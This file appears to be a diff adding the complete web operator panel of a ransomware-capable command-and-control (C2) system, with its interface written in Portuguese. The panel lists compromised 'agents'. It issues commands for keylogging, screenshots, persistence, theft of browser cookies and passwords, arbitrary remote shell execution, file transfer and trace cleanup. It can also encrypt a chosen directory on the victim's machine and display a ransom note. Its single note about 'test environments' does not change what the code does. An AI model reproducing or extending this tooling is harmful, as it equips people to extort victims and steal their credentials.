@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Painel de Controle C2</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&family=Fira+Code&display=swap" rel="stylesheet">
+    <!-- Notyf CSS (para notificações) -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/notyf@3/notyf.min.css">
+    <style>
+        body { font-family: 'Inter', sans-serif; }
+        .fira-code { font-family: 'Fira Code', monospace; }
+        .command-btn { transition: all 0.2s ease-in-out; }
+        .command-btn:hover { transform: translateY(-2px); box-shadow: 0 4px 8px rgba(0,0,0,0.2); }
+        .agent-item { transition: background-color 0.2s; }
+        .agent-item:hover { background-color: #374151; }
+        .agent-item.selected { background-color: #047857; }
+        .tab-btn { transition: all 0.2s; }
+        .tab-btn.active { border-color: #2dd4bf; color: #2dd4bf; }
+    </style>
+</head>
+<body class="bg-gray-900 text-gray-200">
+    <input type="file" id="file-uploader" class="hidden"/>
+    <div class="flex h-screen">
+        <div class="w-1/3 bg-gray-800 p-4 overflow-y-auto border-r border-gray-700 flex flex-col">
+            <div class="flex items-center justify-between mb-4">
+                <h1 class="text-2xl font-bold text-cyan-400">Agentes</h1>
+                <button onclick="deleteSelectedAgents()" class="text-xs text-red-500 hover:text-red-400 hover:underline font-semibold">Excluir Selecionados</button>
+            </div>
+            <div id="agents-list" class="space-y-3 flex-grow"></div>
+        </div>
+        <div class="w-2/3 p-6 flex flex-col">
+            <div id="welcome-panel" class="flex-grow flex items-center justify-center">
+                <div class="text-center">
+                    <h2 class="text-3xl font-semibold text-gray-500">Painel de Controle C2</h2>
+                    <p class="text-gray-600 mt-2">Selecione um agente na lista à esquerda para começar.</p>
+                </div>
+            </div>
+            <div id="interaction-panel" class="hidden flex-grow flex flex-col">
+                <div class="mb-4 pb-4 border-b border-gray-700">
+                    <div class="flex items-center justify-between">
+                        <h2 class="text-2xl font-bold" id="selected-agent-hostname"></h2>
+                        <span id="privilege-badge" class="px-3 py-1 text-sm font-bold rounded-full"></span>
+                    </div>
+                    <p class="text-sm text-gray-400 fira-code" id="selected-agent-details"></p>
+                    <p class="text-xs text-gray-500 mt-2" id="selected-agent-last-seen"></p>
+                </div>
+                <!-- Abas -->
+                <div class="mb-4 border-b border-gray-700">
+                    <nav class="flex space-x-4" aria-label="Tabs">
+                        <button onclick="switchTab('interactive')" id="tab-interactive" class="tab-btn active py-2 px-3 font-medium text-sm rounded-t-lg border-b-2 border-transparent">Interativo</button>
+                        <button onclick="switchTab('system_logs')" id="tab-system_logs" class="tab-btn py-2 px-3 font-medium text-sm rounded-t-lg border-b-2 border-transparent text-gray-400">Logs do Sistema</button>
+                        <button onclick="switchTab('keylogger')" id="tab-keylogger" class="tab-btn py-2 px-3 font-medium text-sm rounded-t-lg border-b-2 border-transparent text-gray-400">Keylogger</button>
+                        <button onclick="switchTab('decrypt')" id="tab-decrypt" class="tab-btn py-2 px-3 font-medium text-sm rounded-t-lg border-b-2 border-transparent text-gray-400">Descriptografar (Local)</button>
+                    </nav>
+                </div>
+                <!-- Conteúdo das Abas -->
+                <div id="content-interactive" class="flex-grow flex flex-col">
+                    <div class="mb-6">
+                        <h3 class="text-xl mb-4 font-semibold">Comandos</h3>
+                        <div class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
+                            <button onclick="issueCommand('network_scan')" class="command-btn bg-indigo-600 hover:bg-indigo-500 text-white font-bold py-2 px-4 rounded-lg">Escanear Rede</button>
+                            <button onclick="issueCommand('keylogger_start')" class="command-btn bg-teal-600 hover:bg-teal-500 text-white font-bold py-2 px-4 rounded-lg">Iniciar Keylogger</button>
+                            <button onclick="issueCommand('keylogger_stop')" class="command-btn bg-yellow-600 hover:bg-yellow-500 text-white font-bold py-2 px-4 rounded-lg">Parar Keylogger</button>
+                            <button onclick="issueCommand('screenshot')" class="command-btn bg-cyan-600 hover:bg-cyan-500 text-white font-bold py-2 px-4 rounded-lg">Capturar Tela</button>
+                            <button onclick="issueCommand('persist')" class="command-btn bg-orange-600 hover:bg-orange-500 text-white font-bold py-2 px-4 rounded-lg">Persistência</button>
+                            <button onclick="initiateDownload()" class="command-btn bg-green-600 hover:bg-green-500 text-white font-bold py-2 px-4 rounded-lg">Download</button>
+                            <button onclick="initiateUpload()" class="command-btn bg-purple-600 hover:bg-purple-500 text-white font-bold py-2 px-4 rounded-lg">Upload</button>
+                            <button onclick="issueCommand('sysinfo')" class="command-btn bg-gray-600 hover:bg-gray-500 text-white font-bold py-2 px-4 rounded-lg">Info Sistema</button>
+                            <button onclick="issueCommand('cookies')" class="command-btn bg-gray-600 hover:bg-gray-500 text-white font-bold py-2 px-4 rounded-lg">Cookies</button>
+                            <button onclick="issueCommand('credentials')" class="command-btn bg-gray-600 hover:bg-gray-500 text-white font-bold py-2 px-4 rounded-lg">Senhas</button>
+                            <button onclick="issueCommand('processes')" class="command-btn bg-gray-600 hover:bg-gray-500 text-white font-bold py-2 px-4 rounded-lg">Processos</button>
+                            <button onclick="showHistory()" class="command-btn bg-blue-600 hover:bg-blue-500 text-white font-bold py-2 px-4 rounded-lg">Ver Histórico</button>
+                            <button onclick="initiateCleanup()" class="command-btn bg-gray-700 hover:bg-gray-600 text-orange-400 font-bold py-2 px-4 rounded-lg border border-orange-500">Limpar Rastros</button>
+                            <button onclick="initiateEncryption()" class="command-btn bg-black hover:bg-red-900 text-red-500 font-bold py-2 px-4 rounded-lg border-2 border-red-600">Encrypt Files</button>
+                            <button onclick="initiateRansomNote()" class="command-btn bg-red-800 hover:bg-red-700 text-white font-bold py-2 px-4 rounded-lg animate-pulse">Exibir Nota</button>
+                            <button onclick="initiateRemoteDecryption()" class="command-btn bg-green-800 hover:bg-green-700 text-white font-bold py-2 px-4 rounded-lg">Descriptografar Alvo</button>
+                        </div>
+                        <div class="mt-6">
+                            <label for="shell-command" class="font-bold">Executar Comando Shell:</label>
+                            <div class="flex gap-2 mt-2">
+                                <input type="text" id="shell-command" class="bg-gray-700 text-white rounded p-2 w-full fira-code" placeholder="ex: whoami (Windows) ou id (Linux)">
+                                <button onclick="issueShellCommand()" class="command-btn bg-red-600 hover:bg-red-500 text-white font-bold py-2 px-4 rounded-lg">Executar</button>
+                            </div>
+                        </div>
+                    </div>
+                    <!-- Janela de Resultados Imediatos -->
+                    <div class="flex-grow flex flex-col mt-4" style="height: 40%;">
+                       <div class="flex justify-between items-center mb-4">
+                           <h3 class="text-xl font-semibold">Resultado do Último Comando</h3>
+                           <button onclick="clearResults()" class="text-xs text-gray-400 hover:text-white">Limpar</button>
+                       </div>
+                       <div id="results-box" class="bg-black rounded p-4 flex-grow overflow-y-auto whitespace-pre-wrap text-sm fira-code"></div>
+                    </div>
+                    <!-- Fila de Tarefas -->
+                    <div class="flex-grow flex flex-col mt-4" style="height: 30%;">
+                       <h3 class="text-xl mb-4 font-semibold">Fila de Tarefas</h3>
+                       <div id="tasks-queue-box" class="bg-black rounded p-4 flex-grow overflow-y-auto whitespace-pre-wrap text-sm fira-code"></div>
+                    </div>
+                </div>
+                <div id="content-system_logs" class="hidden flex-grow flex flex-col">
+                    <pre id="system-logs-box" class="bg-black rounded p-4 flex-grow overflow-y-auto whitespace-pre-wrap text-sm fira-code"></pre>
+                </div>
+                <div id="content-keylogger" class="hidden flex-grow flex flex-col">
+                    <pre id="keylogger-box" class="bg-black rounded p-4 flex-grow overflow-y-auto whitespace-pre-wrap text-sm fira-code"></pre>
+                </div>
+                <div id="content-decrypt" class="hidden flex-grow flex flex-col">
+                    <div class="mb-4">
+                        <label for="decryption-key" class="font-bold">Chave de Criptografia (Base64):</label>
+                        <input type="text" id="decryption-key" class="bg-gray-700 text-white rounded p-2 w-full mt-2 fira-code" placeholder="Cole a chave obtida do relatório de criptografia...">
+                    </div>
+                    <div class="mb-4">
+                        <h3 class="text-xl font-semibold">Arquivos Baixados</h3>
+                        <p class="text-xs text-gray-400">Apenas arquivos com a extensão .encrypted podem ser descriptografados.</p>
+                    </div>
+                    <div id="downloaded-files-list" class="bg-black rounded p-4 flex-grow overflow-y-auto text-sm fira-code"></div>
+                    <div id="decrypt-status" class="mt-4 text-sm"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- Modais -->
+    <div id="history-modal" class="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center p-4 hidden z-50 opacity-0">
+        <div class="bg-gray-800 rounded-lg shadow-xl w-full max-w-4xl h-4/5 flex flex-col">
+            <div class="flex justify-between items-center p-4 border-b border-gray-700"><h2 class="text-2xl font-bold text-cyan-400">Histórico de Resultados</h2><button onclick="closeModal('history-modal')" class="text-gray-400 hover:text-white">&times;</button></div>
+            <div id="history-content" class="p-4 overflow-y-auto text-sm fira-code"></div>
+        </div>
+    </div>
+    <!-- Notyf JS (para notificações) -->
+    <script src="https://cdn.jsdelivr.net/npm/notyf@3/notyf.min.js"></script>
+    <script>
+        const notyf = new Notyf({
+            duration: 5000,
+            position: { x: 'right', y: 'top' },
+            types: [
+                { type: 'success', background: '#2dd4bf', icon: false },
+                { type: 'error', background: '#ef4444', icon: false }
+            ]
+        });
+
+        let selectedAgentId = null;
+        const agentsData = {};
+        let resultsManuallyCleared = false;
+        let lastDisplayedTaskId = null;
+        const agentsToDelete = new Set();
+
+        function toggleAgentForDeletion(agentId, isChecked) {
+            if (isChecked) {
+                agentsToDelete.add(agentId);
+            } else {
+                agentsToDelete.delete(agentId);
+            }
+        }
+
+        function switchTab(tabName) {
+            ['interactive', 'system_logs', 'keylogger', 'decrypt'].forEach(tab => {
+                document.getElementById(`content-${tab}`).style.display = 'none';
+                document.getElementById(`tab-${tab}`).classList.remove('active');
+            });
+            
+            document.getElementById(`content-${tabName}`).style.display = 'flex';
+            document.getElementById(`tab-${tabName}`).classList.add('active');
+
+            if (tabName === 'decrypt') {
+                fetchDownloadedFiles();
+            }
+        }
+
+        function selectAgent(agentId, event) {
+            if (event.target.type === 'checkbox') return;
+            selectedAgentId = agentId;
+            document.querySelectorAll('.agent-item').forEach(item => {
+                item.classList.remove('selected');
+                if (item.dataset.agentId === agentId) item.classList.add('selected');
+            });
+            document.getElementById('welcome-panel').style.display = 'none';
+            const interactionPanel = document.getElementById('interaction-panel');
+            interactionPanel.style.display = 'flex';
+            const agent = agentsData[agentId];
+            document.getElementById('selected-agent-hostname').innerText = `${agent.hostname} (${agent.username})`;
+            document.getElementById('selected-agent-details').innerText = `ID: ${agentId} | SO: ${agent.os_name} | Versão: ${agent.agent_version || '1.0'} | IP Interno: ${agent.internal_ip || 'N/A'} | IP Público: ${agent.external_ip || 'N/A'}`;
+            
+            const lastSeenDate = new Date(agent.last_seen);
+            document.getElementById('selected-agent-last-seen').innerText = `Última Conexão: ${lastSeenDate.toLocaleString('pt-BR')}`;
+            
+            const privilegeBadge = document.getElementById('privilege-badge');
+            const privileges = agent.privileges || 'Desconhecido';
+            privilegeBadge.innerText = privileges;
+            if (privileges === 'Administrador' || privileges === 'Root') {
+                privilegeBadge.className = 'px-3 py-1 text-sm font-bold rounded-full bg-red-600 text-white';
+            } else {
+                privilegeBadge.className = 'px-3 py-1 text-sm font-bold rounded-full bg-green-600 text-white';
+            }
+            switchTab('interactive');
+            clearResults();
+        }
+
+        function fetchTasks() {
+            if (!selectedAgentId) return;
+            const tasksBox = document.getElementById('tasks-queue-box');
+            fetch(`${window.location.origin}/get_tasks/${selectedAgentId}`)
+                .then(response => response.json())
+                .then(tasks => {
+                    if (tasks.length === 0) {
+                        tasksBox.innerHTML = '<span class="text-gray-500">Nenhuma tarefa executada nesta sessão.</span>';
+                        return;
+                    }
+                    let tasksHtml = '';
+                    tasks.slice().reverse().slice(0, 5).forEach(task => {
+                        let statusColor = 'text-yellow-400';
+                        if (task.status === 'Concluído') statusColor = 'text-green-400';
+                        if (task.status === 'Erro') statusColor = 'text-red-400';
+
+                        const timestamp = new Date(task.timestamp_issued).toLocaleTimeString('pt-BR');
+                        const commandText = typeof task.args === 'object' ? task.command : (task.args ? `${task.command}('${String(task.args).substring(0, 30)}...')` : task.command);
+                        
+                        tasksHtml += `<div class="flex justify-between items-center">
+                            <p>${timestamp} - ${commandText}</p>
+                            <p class="${statusColor} font-bold">${task.status}</p>
+                        </div>`;
+                    });
+                    tasksBox.innerHTML = tasksHtml;
+                });
+        }
+        
+        function issueCommand(command, args = "") {
+            if (!selectedAgentId) {
+                notyf.error('Selecione um agente primeiro.');
+                return;
+            }
+            resultsManuallyCleared = false;
+            document.getElementById("results-box").innerHTML = `<span class="text-yellow-400">Enviando comando '${command}'...</span>`;
+            
+            fetch(`${window.location.origin}/issue_command`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ agent_id: selectedAgentId, command: command, args: args }),
+            }).then(() => {
+                notyf.success(`Comando '${command}' enviado para a fila.`);
+                setTimeout(fetchTasks, 500);
+            });
+        }
+        
+        function deleteSelectedAgents() {
+            const agentIdsToDelete = Array.from(agentsToDelete);
+            if (agentIdsToDelete.length === 0) {
+                notyf.error('Nenhum agente selecionado para exclusão.');
+                return;
+            }
+            
+            const confirmation = confirm(`Tem certeza que deseja remover ${agentIdsToDelete.length} agente(s) selecionado(s)?`);
+            if (confirmation) {
+                fetch(`${window.location.origin}/delete_agents`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ agent_ids: agentIdsToDelete })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === 'success') {
+                        notyf.success(`${data.deleted_count} agente(s) foram removidos.`);
+                        agentsToDelete.clear();
+                        if (agentIdsToDelete.includes(selectedAgentId)) {
+                            selectedAgentId = null;
+                            document.getElementById('interaction-panel').style.display = 'none';
+                            document.getElementById('welcome-panel').style.display = 'flex';
+                        }
+                        updateAgentsList();
+                    } else {
+                        notyf.error('Erro ao remover agentes.');
+                    }
+                });
+            }
+        }
+
+        function clearResults() {
+            document.getElementById("results-box").innerHTML = '<span class="text-gray-500">Aguardando comando...</span>';
+            resultsManuallyCleared = true;
+        }
+
+        function fetchResults() {
+            if (!selectedAgentId || resultsManuallyCleared) return;
+            
+            fetch(`${window.location.origin}/get_results/${selectedAgentId}`)
+                .then((response) => response.json())
+                .then((data) => {
+                    if (data.results && data.results.length > 0) {
+                        const latestResult = data.results[data.results.length - 1];
+                        
+                        if (latestResult.task_id !== lastDisplayedTaskId) {
+                            lastDisplayedTaskId = latestResult.task_id;
+                            const resultsBox = document.getElementById("results-box");
+                            let content;
+                            if (latestResult.data_type === "screenshot_result") {
+                                content = '<img src="data:image/png;base64,' + latestResult.data + '" alt="Screenshot" class="max-w-full h-auto rounded"/>';
+                            } else if (latestResult.data_type === "download_success") {
+                                content = `<span class="text-green-400">${latestResult.data}</span>`;
+                            } else if (typeof latestResult.data === "object") {
+                                content = JSON.stringify(latestResult.data, null, 2);
+                            } else {
+                                content = latestResult.data;
+                            }
+                            resultsBox.innerHTML = content;
+                            fetchTasks();
+                        }
+                    }
+                });
+        }
+        
+        function fetchSystemLogs() {
+            if (!selectedAgentId) return;
+            const logsBox = document.getElementById('system-logs-box');
+            fetch(`${window.location.origin}/get_system_logs/${selectedAgentId}`)
+                .then(response => response.text())
+                .then(text => {
+                    if (logsBox.textContent !== text) {
+                        logsBox.textContent = text || 'Nenhum log de sistema para este agente.';
+                        logsBox.scrollTop = logsBox.scrollHeight;
+                    }
+                });
+        }
+
+        function fetchKeylogs() {
+            if (!selectedAgentId) return;
+            const logsBox = document.getElementById('keylogger-box');
+            fetch(`${window.location.origin}/get_keylogs/${selectedAgentId}`)
+                .then(response => response.text())
+                .then(text => {
+                    if (logsBox.textContent !== text) {
+                        logsBox.textContent = text || 'Nenhum log capturado para este agente.';
+                        logsBox.scrollTop = logsBox.scrollHeight;
+                    }
+                });
+        }
+
+        function closeModal(modalId) {
+            const modal = document.getElementById(modalId);
+            modal.classList.add("opacity-0");
+            setTimeout(() => modal.classList.add("hidden"), 300);
+        }
+
+        function issueShellCommand() {
+            const shellCmd = document.getElementById("shell-command").value;
+            if (shellCmd) {
+                issueCommand("shell", shellCmd);
+                document.getElementById("shell-command").value = "";
+            } else {
+                notyf.error("Insira um comando shell.");
+            }
+        }
+
+        function initiateDownload() {
+            if (!selectedAgentId) {
+                notyf.error("Selecione um agente.");
+                return;
+            }
+            const remotePath = prompt("Insira o caminho completo do arquivo para download na máquina alvo:", "C:\\Users\\Public\\Documents\\arquivo.txt");
+            if (remotePath) {
+                issueCommand("download", remotePath);
+            }
+        }
+
+        function initiateUpload() {
+            if (!selectedAgentId) {
+                notyf.error("Selecione um agente.");
+                return;
+            }
+            const uploader = document.getElementById("file-uploader");
+            uploader.click();
+            uploader.onchange = e => {
+                const file = e.target.files[0];
+                if (file) {
+                    const remotePath = prompt(`Insira o caminho completo de destino na máquina alvo (incluindo nome do arquivo):`, `C:\\Users\\Public\\Documents\\${file.name}`);
+                    if (remotePath) {
+                        const reader = new FileReader();
+                        reader.onload = event => {
+                            const fileContentB64 = event.target.result.split(",")[1];
+                            const args = {
+                                destination_path: remotePath,
+                                file_content_b64: fileContentB64
+                            };
+                            issueCommand("upload", args);
+                        };
+                        reader.readAsDataURL(file);
+                        uploader.value = "";
+                    }
+                }
+            };
+        }
+
+        function initiateEncryption() {
+            if (!selectedAgentId) {
+                notyf.error("Selecione um agente.");
+                return;
+            }
+            const targetPath = prompt("Insira o caminho COMPLETO do diretório para CRIPTOGRAFAR na máquina alvo:", "C:\\Users\\Public\\Documents\\TESTE_RANSOMWARE");
+            if (targetPath) {
+                const confirmation = confirm(`!!! AVISO DE AÇÃO DESTRUTIVA !!!\\n\\nVocê está prestes a criptografar TODOS os arquivos em '${targetPath}'.\\nEsta ação é IRREVERSÍVEL sem a chave de criptografia.\\n\\nUse apenas em ambientes de teste controlados.\\n\\nTem certeza absoluta que deseja continuar?`);
+                if (confirmation) {
+                    issueCommand("encrypt", targetPath);
+                }
+            }
+        }
+
+        function initiateRansomNote() {
+            if (!selectedAgentId) {
+                notyf.error("Selecione um agente.");
+                return;
+            }
+            const defaultText = "SEUS ARQUIVOS FORAM CRIPTOGRAFADOS!\\n\\nPara recuperá-los, siga as instruções...";
+            const noteText = prompt("Insira o texto da nota de resgate (use \\\\n para novas linhas):", defaultText);
+            if (noteText) {
+                issueCommand("ransom_note", noteText);
+            }
+        }
+
+        function updateAgentsList() {
+            fetch(`${window.location.origin}/get_agents`)
+                .then((response) => response.json())
+                .then((data) => {
+                    const agentsListDiv = document.getElementById("agents-list");
+                    agentsListDiv.innerHTML = "";
+                    Object.keys(agentsData).forEach((key) => delete agentsData[key]);
+                    Object.assign(agentsData, data);
+                    if (Object.keys(data).length === 0) {
+                        agentsListDiv.innerHTML = '<p class="text-gray-500">Nenhum agente conectado...</p>';
+                        return;
+                    }
+                    for (const agentId in data) {
+                        const agent = data[agentId];
+                        const statusColor = agent.status === "online" ? "bg-green-500" : "bg-gray-500";
+                        const statusText = agent.status === "online" ? "Online" : "Offline";
+                        const isChecked = agentsToDelete.has(agentId) ? 'checked' : '';
+                        const agentElement = document.createElement("div");
+                        agentElement.className = `agent-item p-3 rounded-lg border border-gray-700 ${selectedAgentId === agentId ? "selected" : ""}`;
+                        agentElement.dataset.agentId = agentId;
+                        agentElement.onclick = (event) => selectAgent(agentId, event);
+                        agentElement.innerHTML =
+                            '<div class="flex items-center justify-between">' +
+                            '<div class="flex items-center">' +
+                            `<input type="checkbox" value="${agentId}" onchange="toggleAgentForDeletion('${agentId}', this.checked)" ${isChecked} class="agent-checkbox h-4 w-4 rounded bg-gray-700 border-gray-600 text-cyan-600 focus:ring-cyan-500 mr-3">` +
+                            '<p class="font-bold truncate">' + agent.hostname + " (" + agent.username + ")</p>" +
+                            "</div>" +
+                            '<div class="flex items-center gap-2">' +
+                            '<span class="text-xs font-medium">' + statusText + "</span>" +
+                            '<div class="w-3 h-3 rounded-full ' + statusColor + '"></div>' +
+                            "</div>" +
+                            "</div>" +
+                            '<p class="text-xs text-gray-400 mt-1 ml-7 truncate">ID: ' + agentId + "</p>";
+                        agentsListDiv.appendChild(agentElement);
+                    }
+                });
+        }
+
+        function showHistory() {
+            if (!selectedAgentId) {
+                notyf.error("Selecione um agente.");
+                return;
+            }
+            const modal = document.getElementById("history-modal");
+            const contentDiv = document.getElementById("history-content");
+            contentDiv.innerHTML = '<p class="text-yellow-400">Carregando...</p>';
+            modal.classList.remove("hidden");
+            setTimeout(() => modal.classList.remove("opacity-0"), 10);
+            fetch(`${window.location.origin}/get_results/${selectedAgentId}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.results && data.results.length > 0) {
+                        let historyHtml = "";
+                        data.results.slice().reverse().forEach(result => {
+                            const timestamp = new Date(result.timestamp).toLocaleString("pt-BR");
+                            let resultData = "object" == typeof result.data ? "<pre>" + JSON.stringify(result.data, null, 2) + "</pre>" : "<pre>" + String(result.data).replace(/</g, "&lt;").replace(/>/g, "&gt;") + "</pre>";
+                            historyHtml += `<div class="mb-6 pb-4 border-b border-gray-700"><p class="text-cyan-400 font-semibold">Data: <span class="text-gray-300">${timestamp}</span></p><p class="text-cyan-400 font-semibold">Tipo: <span class="text-gray-300">${result.data_type}</span></p><div class="mt-2 p-2 bg-black rounded">${resultData}</div></div>`;
+                        });
+                        contentDiv.innerHTML = historyHtml;
+                    } else {
+                        contentDiv.innerHTML = '<p class="text-gray-500">Nenhum resultado.</p>';
+                    }
+                });
+        }
+
+        function fetchDownloadedFiles() {
+            if (!selectedAgentId) return;
+            const listDiv = document.getElementById("downloaded-files-list");
+            listDiv.innerHTML = '<p class="text-gray-500">Carregando arquivos...</p>';
+            document.getElementById("decrypt-status").innerHTML = "";
+            fetch(`${window.location.origin}/list_downloads/${selectedAgentId}`)
+                .then(response => response.json())
+                .then(files => {
+                    if (files.length === 0) {
+                        listDiv.innerHTML = '<p class="text-gray-500">Nenhum arquivo baixado deste agente.</p>';
+                        return;
+                    }
+                    let fileHtml = '<ul class="space-y-2">';
+                    files.forEach(file => {
+                        const decryptButton = file.endsWith(".encrypted") ? `<button onclick="decryptFile('${file}')" class="ml-4 text-xs bg-green-600 hover:bg-green-500 px-2 py-1 rounded">Descriptografar</button>` : "";
+                        fileHtml += `<li class="flex justify-between items-center"><span>${file}</span>${decryptButton}</li>`;
+                    });
+                    fileHtml += "</ul>";
+                    listDiv.innerHTML = fileHtml;
+                });
+        }
+
+        function decryptFile(filename) {
+            const key = document.getElementById("decryption-key").value;
+            if (!key) {
+                notyf.error("Por favor, insira a chave de criptografia.");
+                return;
+            }
+            const statusDiv = document.getElementById("decrypt-status");
+            statusDiv.innerHTML = `<p class="text-yellow-400">Descriptografando ${filename}...</p>`;
+            fetch(`${window.location.origin}/decrypt_file`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ agent_id: selectedAgentId, filename: filename, key_b64: key }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === "success") {
+                    statusDiv.innerHTML = `<p class="text-green-400">${data.message}</p>`;
+                } else {
+                    statusDiv.innerHTML = `<p class="text-red-400">Erro: ${data.message}</p>`;
+                }
+                setTimeout(fetchDownloadedFiles, 1000);
+            });
+        }
+
+        function initiateRemoteDecryption() {
+            if (!selectedAgentId) {
+                notyf.error("Selecione um agente.");
+                return;
+            }
+            const targetPath = prompt("Insira o caminho COMPLETO do diretório para DESCRIPTOGRAFAR no alvo:", "C:\\Users\\Public\\Documents\\TESTE_RANSOMWARE");
+            if (!targetPath) return;
+            const key_b64 = prompt("Agora, insira a chave de criptografia (Base64) obtida do relatório:");
+            if (!key_b64) return;
+            const args = { target_path: targetPath, key_b64: key_b64 };
+            issueCommand("decrypt_target", args);
+        }
+        
+        function initiateCleanup() {
+            if (!selectedAgentId) {
+                notyf.error("Selecione um agente.");
+                return;
+            }
+            const confirmation = confirm("ATENÇÃO: Isso removerá a persistência e o executável do agente no sistema alvo. O agente ficará offline permanentemente. Deseja continuar?");
+            if (confirmation) {
+                issueCommand("cleanup");
+            }
+        }
+
+        setInterval(() => {
+            updateAgentsList();
+            fetchResults();
+            fetchSystemLogs();
+            fetchKeylogs();
+            fetchTasks();
+        }, 3000);
+        
+        window.onload = updateAgentsList;
+    </script>
+</body>
+</html>
